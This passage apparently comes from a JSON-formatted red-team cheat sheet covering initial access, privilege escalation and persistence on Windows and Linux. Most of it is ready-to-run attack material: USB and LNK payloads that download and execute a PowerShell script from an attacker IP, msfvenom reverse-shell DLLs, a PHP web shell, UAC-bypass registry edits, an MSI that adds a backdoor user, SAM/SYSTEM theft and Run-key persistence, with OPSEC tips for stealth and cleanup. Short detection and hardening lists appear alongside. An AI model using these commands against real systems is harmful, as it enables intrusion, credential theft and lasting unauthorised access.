              "language": "javascript",
              "text": "// JavaScript fake update prompt\nif(confirm(\"Adobe Flash Player update required. Install now?\")) {\n    window.location = \"http://10.10.14.20/FlashPlayer_installer.exe\";\n}"
            },
            {
              "type": "p",
              "parts": [
                "**Watering Hole Attacks**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Compromise legitimate website\n# Inject malicious code into frequently visited site\n<script src=\"http://10.10.14.20/exploit.js\"></script>"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: ",
                "**Shell access**",
                " when a user visits a ",
                "**compromised site**",
                " with a vulnerable browser/plugins."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**Network monitoring**",
                    " for ",
                    "**beaconing**"
                  ]
                },
                {
                  "parts": [
                    "**Browser isolation**",
                    " technologies"
                  ]
                },
                {
                  "parts": [
                    "**Content Security Policy (CSP)**"
                  ]
                },
                {
                  "parts": [
                    "Regular ",
                    "**browser/plugin updates**"
                  ]
                },
                {
                  "parts": [
                    "**EDR monitoring**",
                    " browser child processes"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**Metasploit**",
                ", ",
                "**BeEF**",
                ", ",
                "**Social Engineer Toolkit**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Use ",
                "**SSL certificates**",
                ", reputable-looking domains, test ",
                "**exploit reliability**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "1.4 ",
                "**Exploits**",
                " (",
                "**RCE**",
                ", ",
                "**0-days**",
                ")\nWhat it is and Why it Matters: Leveraging ",
                "**software vulnerabilities**",
                " for ",
                "**remote code execution (RCE)**",
                ", from ",
                "**public exploits**",
                " to undisclosed ",
                "**zero-days (0-days)**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Public Exploit Usage**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Search for exploits\nsearchsploit \"Apache 2.4.49\"\nsearchsploit \"Windows SMB\"\n\n# Metasploit modules\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.10\nexploit\n\n# Manual exploit compilation\ngcc -o exploit exploit.c\n./exploit"
            },
            {
              "type": "p",
              "parts": [
                "**Web Application RCE**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# SQL injection to RCE\n'; EXEC xp_cmdshell 'whoami' --\n\n# File upload RCE\n<?php system($_GET['cmd']); ?>\n\n# Deserialization attacks\njava -jar ysoserial.jar CommonsCollections1 'cmd.exe /c whoami' > payload.ser"
            },
            {
              "type": "p",
              "parts": [
                "**Service Exploitation**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# SSH exploitation\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS 10.10.10.0/24\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n\n# Database exploitation\nuse auxiliary/scanner/mysql/mysql_login\nset RHOSTS 10.10.10.0/24\nrun"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Direct ",
                "**system access**",
                " through ",
                "**software vulnerabilities**",
                ". May cause ",
                "**service disruption**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular ",
                    "**vulnerability scanning**"
                  ]
                },
                {
                  "parts": [
                    "**Patch management**"
                  ]
                },
                {
                  "parts": [
                    "**WAF implementation**"
                  ]
                },
                {
                  "parts": [
                    "**Network segmentation**"
                  ]
                },
                {
                  "parts": [
                    "**EDR exploit prevention**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**Metasploit**",
                ", ",
                "**SearchSploit**",
                ", ",
                "**Nuclei**",
                ", ",
                "**Custom exploit code**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Research ",
                "**target environment**",
                ", test ",
                "**exploits in a lab**",
                ", have ",
                "**fallback methods**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "1.5 ",
                "**USB/Removable Media Attacks**",
                "\nWhat it is and Why it Matters: ",
                "**Physical attacks**",
                " using ",
                "**USB devices**",
                " for ",
                "**initial access**",
                ", particularly effective in ",
                "**air-gapped environments**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Bad USB Attacks**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Rubber Ducky payload\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\nENTER\n\n# Teensy payload\nvoid setup() {\n    Keyboard.begin();\n    delay(3000);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press('r');\n    Keyboard.releaseAll();\n    delay(500);\n    Keyboard.print(\"cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\");\n    Keyboard.press(KEY_RETURN);\n    Keyboard.releaseAll();\n}"
            },
            {
              "type": "p",
              "parts": [
                "**AutoRun .inf Files**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "ini",
              "text": "[autorun]\nopen=malware.exe\nicon=malware.exe\naction=Open documents\nlabel=Corporate Files"
            },
            {
              "type": "p",
              "parts": [
                "**LNK File Attacks**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Malicious LNK file\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"Important Documents.lnk\")\n$Shortcut.TargetPath = \"cmd.exe\"\n$Shortcut.Arguments = \"/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n$Shortcut.Save()"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: ",
                "**Physical access**",
                " required. Success depends on ",
                "**AutoRun settings**",
                " and ",
                "**user behavior**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**Disable AutoRun**",
                    " via ",
                    "**GPO**"
                  ]
                },
                {
                  "parts": [
                    "**USB device control policies**"
                  ]
                },
                {
                  "parts": [
                    "**User training**",
                    " on unknown devices"
                  ]
                },
                {
                  "parts": [
                    "**Endpoint monitoring**",
                    " for USB devices"
                  ]
                },
                {
                  "parts": [
                    "**Application whitelisting**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**USB Rubber Ducky**",
                ", ",
                "**Teensy**",
                ", ",
                "**PoisonTap**",
                ", ",
                "**Evilduino**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Consider ",
                "**physical security**",
                ", use ",
                "**convincing device labels**",
                ", test on ",
                "**target OS versions**",
                "."
              ]
            },
            {
              "type": "hr"
            },
            {
              "type": "ol",
              "items": [
                {
                  "parts": [
                    "🚀 ",
                    "**Privilege Escalation**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.1 ",
                "**Token Manipulation**",
                "\nWhat it is and Why it Matters: Abusing ",
                "**Windows access tokens**",
                " to impersonate ",
                "**higher-privileged users**",
                " or the ",
                "**SYSTEM account**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Mimikatz Token Commands**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Load incognito in meterpreter\nmeterpreter > load incognito\n\n# List available tokens\nmeterpreter > list_tokens -u\n\n# Impersonate token\nmeterpreter > impersonate_token \"NT AUTHORITY\\\\SYSTEM\"\nmeterpreter > impersonate_token \"DOMAIN\\\\Administrator\"\n\n# Revert to original token\nmeterpreter > revert_to_self"
            },
            {
              "type": "p",
              "parts": [
                "**Rotten Potato/Juicy Potato**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Juicy Potato for SERVICE -> SYSTEM\nJuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *\n\n# Rotten Potato from meterpreter\nmeterpreter > upload /usr/share/webshells/rottenpotato.exe\nmeterpreter > execute -H -c -f rottenpotato.exe\nmeterpreter > getuid"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell Token Manipulation**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Check current token privileges\nwhoami /priv\nwhoami /groups\n\n# PowerShell Incognito\nImport-Module .\\Incognito.ps1\nInvoke-TokenManipulation -ImpersonateUser -Username \"DOMAIN\\Administrator\"\n\n# Check for SeImpersonate privilege\n([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Ability to execute commands as different users, often ",
                "**SYSTEM privileges**",
                " from ",
                "**service accounts**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor ",
                    "**token manipulation**",
                    " (",
                    "**Event ID 4672**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "**EDR detection**",
                    " of ",
                    "**token theft patterns**"
                  ]
                },
                {
                  "parts": [
                    "Limit ",
                    "**SeDebugPrivilege**",
                    " and ",
                    "**SeImpersonatePrivilege**"
                  ]
                },
                {
                  "parts": [
                    "**Protected Process Light (PPL)**"
                  ]
                },
                {
                  "parts": [
                    "Regular ",
                    "**privilege audits**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**Mimikatz**",
                ", ",
                "**Incognito**",
                ", ",
                "**Juicy Potato**",
                ", ",
                "**Metasploit token modules**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Use from ",
                "**service accounts**",
                " with ",
                "**SeImpersonate**",
                ", avoid obvious ",
                "**process injection**",
                ", ",
                "**clean up tokens**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.2 ",
                "**UAC Bypass**",
                "\nWhat it is and Why it Matters: Bypassing ",
                "**User Account Control (UAC)**",
                " prompts to execute code with ",
                "**elevated privileges**",
                " without user interaction."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**FodHelper UAC Bypass**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Registry modification for fodhelper\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f\nfodhelper.exe\n\n# Cleanup\nreg delete \"HKCU\\Software\\Classes\\ms-settings\\\" /f"
            },
            {
              "type": "p",
              "parts": [
                "**Event Viewer UAC Bypass**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using eventvwr.exe\nreg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\neventvwr.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit UAC Modules**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Various UAC bypass modules\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/bypassuac_eventvwr\nset SESSION 1\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "**SilentClean UAC Bypass**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using sdclt.exe\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /d \"C:\\malware.exe\" /f\nsdclt.exe /kickoffelev"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell UAC Bypass**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# UACME techniques\nImport-Module .\\Invoke-UACBypass.ps1\nInvoke-UACBypass -Payload \"C:\\malware.exe\"\n\n# Check UAC level\n$uacLevel = (Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\").EnableLUA\nif ($uacLevel -eq 1) { \"UAC Enabled\" }"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: ",
                "**Elevated privileges**",
                " without a ",
                "**UAC prompt**",
                ", works on default ",
                "**UAC settings**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor ",
                    "**registry modifications**",
                    " in ",
                    {
                      "type": "inline_code",
                      "text": "Classes"
                    },
                    " keys"
                  ]
                },
                {
                  "parts": [
                    "**EDR detection**",
                    " of ",
                    "**UAC bypass patterns**"
                  ]
                },
                {
                  "parts": [
                    "Set ",
                    "**UAC to the highest level**"
                  ]
                },
                {
                  "parts": [
                    "**AppLocker restrictions**"
                  ]
                },
                {
                  "parts": [
                    "**Process monitoring**",
                    " for elevation patterns"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**UACME**",
                ", ",
                "**Metasploit UAC modules**",
                ", ",
                "**PowerShell Empire**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Test on ",
                "**target OS version**",
                ", use the least noisy method first, ",
                "**clean registry changes**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.3 ",
                "**Kernel Exploits**",
                "\nWhat it is and Why it Matters: Exploiting ",
                "**vulnerabilities**",
                " in the ",
                "**Windows/Linux kernel**",
                " to gain ",
                "**SYSTEM/root privileges**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Windows Kernel Exploits**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Windows Exploit Suggester\npython windows-exploit-suggester.py --database 2021-06-10-mssb.xls --systeminfo systeminfo.txt\n\n# Manual system info collection\nsysteminfo\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Common Windows kernel exploits\n# MS16-032 (Secondary Logon Handle)\n# MS17-010 (EternalBlue)\n# CVE-2021-1675 (PrintNightmare)\n# CVE-2022-21882 (Win32k Elevation)\n\n# Compile and run exploit\ni686-w64-mingw32-gcc MS16-032.c -o MS16-032.exe\nMS16-032.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Linux Kernel Exploits**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# DirtyCow (CVE-2016-5195)\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty\n\n# DirtyPipe (CVE-2022-0847)\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n\n# Check kernel version\nuname -a\ncat /proc/version\n\n# Check for SELinux/AppArmor\nsestatus\naa-status"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit Local Exploits**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Local exploit suggester\nuse post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun\n\n# Specific kernel exploits\nuse exploit/windows/local/ms16_032_secondary_logon_handle_privesc\nset SESSION 1\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: ",
                "**SYSTEM/root privileges**",
                " if successful, potential ",
                "**system instability**",
                " if failed."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular ",
                    "**patching and updates**"
                  ]
                },
                {
                  "parts": [
                    "**EDR kernel-level monitoring**"
                  ]
                },
                {
                  "parts": [
                    "**Driver signature enforcement**"
                  ]
                },
                {
                  "parts": [
                    "**Kernel Patch Protection (PatchGuard)**"
                  ]
                },
                {
                  "parts": [
                    "**System crash analysis**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**Windows-Exploit-Suggester**",
                ", ",
                "**Linux-Exploit-Suggester**",
                ", ",
                "**Metasploit**",
                ", ",
                "**ExploitDB**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Test ",
                "**exploits in a similar environment**",
                " first, have ",
                "**backup access methods**",
                ", consider ",
                "**system stability impact**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.4 ",
                "**Unquoted Service Paths**",
                "\nWhat it is and Why it Matters: ",
                "**Windows services**",
                " with ",
                "**unquoted paths**",
                " containing spaces can be hijacked by placing ",
                "**malicious executables**",
                " in earlier path components."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Find Unquoted Service Paths**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using wmic\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n\n# Using sc\nsc qc \"ServiceName\"\n\n# PowerShell method\nGet-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"'} | Select-Object Name, PathName"
            },
            {
              "type": "p",
              "parts": [
                "**Check Directory Permissions**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using icacls\nicacls \"C:\\Program Files\\Vulnerable App\"\n\n# Using accesschk\naccesschk.exe -uwdq \"C:\\Program Files\\Vulnerable App\"\n\n# PowerShell permissions check\nGet-Acl \"C:\\Program Files\\Vulnerable App\" | Format-List"
            },
            {
              "type": "p",
              "parts": [
                "**Exploitation Example**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Service path: C:\\Program Files\\Vulnerable App\\service.exe\n# Place malware at: C:\\Program.exe\n\n# Or service path: C:\\Program Files\\Vulnerable Folder\\service.exe  \n# Place malware at: C:\\Program Files\\Vulnerable.exe\n\ncopy malware.exe \"C:\\Program.exe\"\n# Service will try to run C:\\Program.exe instead of intended executable"
            },
            {
              "type": "p",
              "parts": [
                "**Automated Tools**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerUp module\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# WinPEAS for Windows\nwinpeas.exe quiet servicesinfo\n\n# Metasploit module\nuse exploit/windows/local/trusted_service_path\nset SESSION 1\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Service starts your executable instead of the legitimate one when restarted."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor for ",
                    "**executables in unusual locations**"
                  ]
                },
                {
                  "parts": [
                    "Service executable ",
                    "**digital signature verification**"
                  ]
                },
                {
                  "parts": [
                    "Regular ",
                    "**service path auditing**"
                  ]
                },
                {
                  "parts": [
                    "**EDR detection**",
                    " of ",
                    "**service path hijacking**"
                  ]
                },
                {
                  "parts": [
                    "**Quote all service paths**",
                    " in deployments"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**PowerUp**",
                ", ",
                "**WinPEAS**",
                ", ",
                "**AccessChk**",
                ", ",
                "**SC.exe**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Use filenames that look legitimate, time execution with ",
                "**service restarts**",
                ", ",
                "**clean up**",
                " after exploitation."
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.5 ",
                "**DLL Hijacking**",
                "\nWhat it is and Why it Matters: Placing ",
                "**malicious DLLs**",
                " where applications will load them instead of legitimate ones, inheriting the application's ",
                "**privileges**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Find DLL Hijacking Opportunities**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Process Monitor for DLL search order\nprocmon.exe /AcceptEula /Quiet /BackingFile log.pml\n# Filters: Result is NAME NOT FOUND, Path ends with .dll\n\n# Manual checking with listdlls\nlistdlls.exe -d example.dll\n\n# Common hijack locations:\n# - Application directory (writable)\n# - Windows directories (if writable)  \n# - Current directory"
            },
            {
              "type": "p",
              "parts": [
                "**Generate Malicious DLL**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Meterpreter DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# Simple reverse shell DLL\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# For specific architecture\nmsfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack32.dll"
            },
            {
              "type": "p",
              "parts": [
                "**DLL Proxying (Maintain Functionality)**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cpp",
              "text": "// Forward exports while adding malicious code\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction\")\n\n// DLLMain with malicious code\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        // Malicious code here\n        system(\"cmd.exe /c whoami > C:\\\\output.txt\");\n    }\n    return TRUE;\n}"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell Discovery**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Find missing DLLs\nGet-Process | ForEach-Object { \n    $_.Modules | Where-Object {$_.FileName -eq $null} | Select-Object ProcessName\n}\n\n# Check writable directories\nGet-ChildItem \"C:\\\" -Recurse -Directory | Get-Acl | Where-Object {$_.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}}\n\n# PowerSploit module\nImport-Module .\\PowerUp.ps1\nFind-ProcessDLLHijack"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Malicious DLL loads when a vulnerable application runs, inherits the application's ",
                "**privileges**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**DLL search order hardening**"
                  ]
                },
                {
                  "parts": [
                    "**Code signing verification**"
                  ]
                },
                {
                  "parts": [
                    "Monitor ",
                    "**DLL loads from unusual locations**"
                  ]
                },
                {
                  "parts": [
                    "**EDR detection**",
                    " of known ",
                    "**hijack patterns**"
                  ]
                },
                {
                  "parts": [
                    "**Protected processes (PPL)**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**Process Monitor**",
                ", ",
                "**DLL Export Viewer**",
                ", ",
                "**PowerSploit**",
                ", ",
                "**Rattler**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Test thoroughly to avoid crashes, use ",
                "**DLL proxying**",
                " for ",
                "**stealth**",
                ", target applications that run with ",
                "**elevated privileges**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "4.6 ",
                "**Misconfigurations Exploitation**",
                "\nWhat it is and Why it Matters: Leveraging ",
                "**system misconfigurations**",
                " for ",
                "**privilege escalation**",
                " without traditional exploits."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Service Permission Checks**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check service permissions with accesschk\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Everyone\" * /accepteula\n\n# Check specific service\nsc qc \"VulnerableService\"\naccesschk.exe -ucqv VulnerableService\n\n# PowerShell service checks\nGet-Service | ForEach-Object { \n    $perms = sc.exe sdshow $_.Name\n    if ($perms -like \"*WD*\") { Write-Host \"Weak permissions on: $($_.Name)\" }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**AlwaysInstallElevated**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check if AlwaysInstallElevated is enabled\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Create malicious MSI\nmsfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi > setup.msi\n\n# Install MSI with system privileges\nmsiexec /quiet /qn /i setup.msi\n\n# Metasploit module\nuse exploit/windows/local/always_install_elevated\nset SESSION 1\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "**Unattended Install Files**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Find unattended installation files\ndir /s *unattend.xml\ndir /s *sysprep.inf\ndir /s *sysprep.xml\n\n# Check for credentials\ntype C:\\Windows\\Panther\\unattend.xml\nfindstr /S /I \"password\" *.xml *.ini *.txt\n\n# Common locations:\n# C:\\Windows\\Panther\\\n# C:\\Windows\\Panther\\Unattend\\\n# C:\\Windows\\System32\\sysprep\\"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell Misconfiguration Checks**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerUp for comprehensive checks\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# Check for password in files\nGet-ChildItem C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String \"password\"\n\n# Check registry for passwords\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>$null\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword\n\n# Scheduled task permissions\nschtasks /query /fo LIST /v\nGet-ScheduledTask | Where-Object {$_.Principal.UserId -eq \"Users\"}"
            },
            {
              "type": "p",
              "parts": [
                "**Writable Service Binaries**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Find services with writable binaries\nGet-WmiObject -Class Win32_Service | ForEach-Object {\n    $path = $_.PathName.Trim('\"')\n    if (Test-Path $path) {\n        $acl = Get-Acl $path\n        if ($acl.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}) {\n            Write-Host \"Writable service binary: $path\"\n        }\n    }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**Backup Operator to Domain Admin**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# If in Backup Operators group\n# Use diskshadow to create shadow copy\ndiskshadow.exe /s script.txt\n\n# Script.txt contents:\nset context persistent nowriters\nset metadata c:\\windows\\temp\\meta.cab\nset verbose on\nbegin backup\nadd volume c: alias mydrive\ncreate\nexpose %mydrive% z:\nend backup\n\n# Then copy SAM/SYSTEM from Z:\\"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Various ",
                "**privilege escalation paths**",
                " depending on found ",
                "**misconfigurations**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular ",
                    "**security configuration audits**"
                  ]
                },
                {
                  "parts": [
                    "**Least privilege principle**",
                    " for services"
                  ]
                },
                {
                  "parts": [
                    "**Disable AlwaysInstallElevated**"
                  ]
                },
                {
                  "parts": [
                    "**Clean up unattended installation files**"
                  ]
                },
                {
                  "parts": [
                    "Monitor for ",
                    "**configuration changes**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**PowerUp**",
                ", ",
                "**WinPEAS**",
                ", ",
                "**AccessChk**",
                ", ",
                "**Seatbelt**",
                ", ",
                "**PrivescCheck**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Use ",
                "**built-in tools**",
                " when possible, avoid making unnecessary changes, ",
                "**document found misconfigurations**",
                " for reporting."
              ]
            }
          ]
        },
        {
          "id": "ok",
          "title": "TEST",
          "content": [
            {
              "type": "h2",
              "text": "3. 🔁 Persistence"
            },
            {
              "type": "h3",
              "text": "3.1 Registry Keys"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Windows Registry run keys automatically execute programs on user logon or system startup. This is a classic persistence mechanism that is often hard to detect."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**User-level persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Current User Run Key\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"C:\\malware.exe\" /f\n\n# Explorer Run Key\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\malware.exe\" /f"
            },
            {
              "type": "p",
              "parts": [
                "**System-level persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
